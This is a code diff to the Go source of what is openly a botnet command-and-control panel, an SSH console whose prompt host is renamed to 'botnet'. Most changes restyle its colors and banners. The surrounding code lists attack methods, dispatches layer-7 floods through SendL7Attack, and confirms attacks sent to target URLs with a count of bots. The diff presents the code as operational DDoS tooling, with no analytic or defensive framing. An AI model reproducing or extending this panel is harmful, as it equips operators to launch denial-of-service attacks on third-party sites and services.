@@ -15,39 +15,43 @@ import (
 )
 
 const (
-	ansiReset     = "\x1b[0m"
-	ansiPrimary   = "\x1b[37m" // light gray
-	ansiCommands  = "\x1b[97m" // bright white
-	ansiPrompt    = "\x1b[35m" // purple
-	ansiPath      = "\x1b[97m" // bright white
-	ansiSuccess   = "\x1b[92m" // neon green
-	ansiSystem    = "\x1b[95m" // violet
-	ansiNumbers   = "\x1b[36m" // cyan
-	ansiWarning   = "\x1b[33m" // yellow
-	ansiError     = "\x1b[31m" // red
-	ansiSeparator = "\x1b[97m" // bright white
-	ansiBlink     = "\x1b[5m"
+	ansiReset     = "\x1b[0m"        // Resetea el color al predeterminado
+	ansiPrimary   = "\x1b[37m"       // Blanco para el texto principal
+	ansiCommands  = "\x1b[97m"       // Blanco brillante para comandos y elementos interactivos
+	ansiPrompt    = "\x1b[38;5;196m" // 🔴 rojo 256
+	ansiPath      = "\x1b[97m"       // Blanco para rutas
+	ansiSuccess   = "\x1b[92m"       // Verde brillante para éxitos
+	ansiSystem    = "\x1b[38;5;196m" // 🔴 rojo 256
+	ansiNumbers   = "\x1b[36m"       // Cian para números y estadísticas
+	ansiWarning   = "\x1b[33m"       // Amarillo para advertencias
+	ansiError     = "\x1b[31m"       // Rojo para errores
+	ansiSeparator = "\x1b[97m"       // Blanco para separadores y texto neutro
+	ansiBlink     = "\x1b[5m"        // Parpadeo para el prompt
 )
 
 const (
-	promptHost = "cnc"
+	promptHost = "botnet"
 	promptPath = "~/panel"
 
 	loginUsernameMaxAttempts = 2
 	loginPasswordMaxAttempts = 2
 )
 
-func purpleGradientText(s string) string {
+func redGradientText(s string) string {
 	gradient := []string{
-		"\x1b[38;5;141m",
-		"\x1b[38;5;135m",
-		"\x1b[38;5;129m",
-		"\x1b[38;5;93m",
-		"\x1b[38;5;57m",
-		"\x1b[38;5;56m",
-		"\x1b[38;5;55m",
-		"\x1b[38;5;54m",
-		"\x1b[38;5;53m",
+		"\x1b[38;5;52m",
+		"\x1b[38;5;88m",
+		"\x1b[38;5;124m",
+		"\x1b[38;5;160m",
+		"\x1b[38;5;196m",
+		"\x1b[38;5;203m",
+		"\x1b[38;5;209m",
+		"\x1b[38;5;203m",
+		"\x1b[38;5;196m",
+		"\x1b[38;5;160m",
+		"\x1b[38;5;124m",
+		"\x1b[38;5;88m",
+		"\x1b[38;5;52m",
 	}
 
 	var out strings.Builder
@@ -156,7 +160,7 @@ func writeGradientTable(conn net.Conn, headers []string, rows [][]string) {
 	for _, h := range headers {
 		table.Header.Cells = append(table.Header.Cells, &simpletable.Cell{
 			Align: simpletable.AlignCenter,
-			Text:  purpleGradientText(h),
+			Text:  redGradientText(h),
 		})
 	}
 
@@ -165,7 +169,7 @@ func writeGradientTable(conn net.Conn, headers []string, rows [][]string) {
 		for i, value := range row {
 			text := value
 			if i == 0 {
-				text = purpleGradientText(value)
+				text = redGradientText(value)
 			}
 			cells = append(cells, &simpletable.Cell{
 				Align: simpletable.AlignLeft,
@@ -180,64 +184,8 @@ func writeGradientTable(conn net.Conn, headers []string, rows [][]string) {
 	conn.Write([]byte(strings.ReplaceAll(colored, "\n", "\r\n") + "\r\n"))
 }
 
-func writeLoginHeader(conn net.Conn) {
-	banner := []string{
-		"         ~+",
-		"",
-		"                 *       +",
-		"           '                  |",
-		"       ()    .-.,=\"``\"=.    - o -",
-		"             '=/ _       \\     |",
-		"          *   |  '=._    |",
-		"               \\     `=./`,        '",
-		"            .   '=.__.=' `='      *",
-		"   +                         +",
-		"        O      *        '       .",
-	}
-
-	planetGradient := []string{
-		"\x1b[38;5;141m",
-		"\x1b[38;5;135m",
-		"\x1b[38;5;129m",
-		"\x1b[38;5;93m",
-		"\x1b[38;5;57m",
-		"\x1b[38;5;56m",
-		"\x1b[38;5;55m",
-		"\x1b[38;5;54m",
-		"\x1b[38;5;53m",
-	}
-
-	starNeon := "\x1b[97m"
-	starAlt := "\x1b[92m"
-
-	for i := 0; i < len(banner); i++ {
-		line := banner[i]
-		color := planetGradient[i%len(planetGradient)]
-		var out strings.Builder
-		out.Grow(len(line) * 2)
-		for _, ch := range line {
-			switch ch {
-			case '*', '+', '\'', '.':
-				if (i+int(ch))%2 == 0 {
-					out.WriteString(starNeon)
-				} else {
-					out.WriteString(starAlt)
-				}
-				out.WriteRune(ch)
-				out.WriteString(ansiReset)
-			default:
-				out.WriteString(color)
-				out.WriteRune(ch)
-				out.WriteString(ansiReset)
-			}
-		}
-		conn.Write([]byte(out.String() + "\r\n"))
-	}
-	conn.Write([]byte("\r\n"))
-}
-
 func loginCredentialPrompt(label string) string {
-	return fmt.Sprintf("%s%s%s %s->%s %s", ansiPrompt, label, ansiReset, ansiPrompt, ansiReset, ansiCommands)
+	return fmt.Sprintf("%s%s%s %s->%s %s", ansiCommands, label, ansiReset, ansiPrompt, ansiReset, ansiCommands)
 }
 
 func adminPrompt(session *Session) string {
@@ -286,8 +234,7 @@ func FormatBool(b bool) string {
 func AdminSSH(conn net.Conn) {
 	// Consola interactiva ANSI sobre canal SSH.
 	conn.Write([]byte("\033[2J\033[1H"))
-	writeLoginHeader(conn)
-	conn.Write([]byte("\r\n" + ansiPrompt + "Enter your credentials:" + ansiReset + "\r\n\r\n"))
+	writeLoginBanner(conn)
 
 	var (
 		account *User
@@ -404,14 +351,17 @@ func AdminSSH(conn net.Conn) {
 
 		switch cmdName {
 
+		// Help command
+		//==============================================================================================================================================================================================================================================================================================================================//
+
 		case "?", "help", "h":
-			rows := [][]string{
-				{"clear", ansiCommands + "Clears your terminal" + ansiReset},
-				{"methods", ansiCommands + "List available attack methods" + ansiReset},
-				{"flags <.method>", ansiCommands + "View attack flags for a specific method" + ansiReset},
-				{"themes", ansiCommands + "List available console themes" + ansiReset},
+			if !writeHelpBanner(session.Conn, session.User) {
+				session.Conn.Write([]byte(ansiWarning + "No help banner found for the current theme." + ansiReset + "\r\n"))
 			}
-			writeGradientTable(session.Conn, []string{"Command", "Description"}, rows)
+			continue
+
+			// Admin help command
+			//==============================================================================================================================================================================================================================================================================================================================//
 
 		case "admin?", "adminhelp":
 			if !session.User.Admin {
@@ -1667,7 +1617,7 @@ func AdminSSH(conn net.Conn) {
 				continue
 			}
 			SendL7Attack(attack)
-			face := purpleGradientText("X_X")
+			face := redGradientText("X_X")
 			session.Conn.Write([]byte(ansiSuccess + "Attack" + ansiReset + " " + ansiCommands + "sent successfully to " + attack.URL + " for " + strconv.Itoa(attack.Duration) + " seconds " + face + ansiReset + "\r\n"))
 			continue
 
@@ -1760,7 +1710,7 @@ func AdminSSH(conn net.Conn) {
 				duration = parts[2]
 			}
 			bots := strconv.Itoa(len(Clients))
-			face := purpleGradientText("X_X")
+			face := redGradientText("X_X")
 			session.Conn.Write([]byte(ansiSuccess + "Attack" + ansiReset + " " + ansiCommands + "sent successfully to " + target + " for " + duration + " with " + bots + " bots " + ansiReset + face + ansiReset + "\r\n"))
 
 		}
